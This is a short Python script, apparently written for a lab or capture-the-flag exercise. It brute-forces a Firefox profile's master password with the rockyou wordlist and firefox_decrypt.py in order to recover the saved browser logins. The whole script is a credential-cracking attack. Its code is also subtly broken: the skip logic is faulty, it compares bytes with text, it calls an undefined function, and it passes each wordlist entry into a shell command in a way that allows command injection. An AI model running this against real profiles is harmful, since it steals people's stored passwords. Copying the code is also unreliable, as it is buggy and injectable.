import subprocess

with open('/usr/share/wordlists/rockyou_no_unicode.txt', 'r') as f:
	
	skipping = True
	while True:
		password = f.readline().strip()

		if password != '321456' and skipping:
			skipping = False
			continue

		print(f"Trying password : {password}")
		try:
			out = subprocess.check_output(f"echo '{password}' | python3 firefox_decrypt.py --no-interactive .mozilla/firefox", stderr=subprocess.STDOUT, shell=True)
		except Exception as e:
			out = str(e.output)

		if 'Master password is not correct' not in out:
			print("SUCCESS, found password : ")
			print(byte(password))
			exit()
